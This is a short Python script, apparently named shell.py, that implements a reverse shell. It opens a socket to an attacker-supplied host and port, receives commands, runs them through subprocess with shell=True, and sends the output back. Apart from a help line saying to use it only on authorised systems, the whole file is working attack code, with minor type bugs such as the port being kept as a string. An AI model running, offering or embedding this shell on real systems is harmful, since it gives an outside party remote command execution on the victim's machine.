#imports
import sys 
import subprocess
import socket 

#vars
LHOST = str(sys.argv[1])
LPORT = sys.argv[2]

#help menu 

if LHOST == "--help" or LHOST == "-h":
    print("format python shell.py <host> <port>")
    print("only use on system you have the right to!")
    exit()

def main():
    cSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create a socket INET object
    cSocket.connect((LHOST, LPORT)) #connect to attacker
    
    while True: 
        command = cSocket.recv(1024) #define the command

        if 'exit' in command: 
            cSocket.close() 
            break
        else: 
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cSocket.send( CMD.stdout.read() ) #send back result
            cSocket.send( CMD.stderr.read() ) #send error if there's any

main()
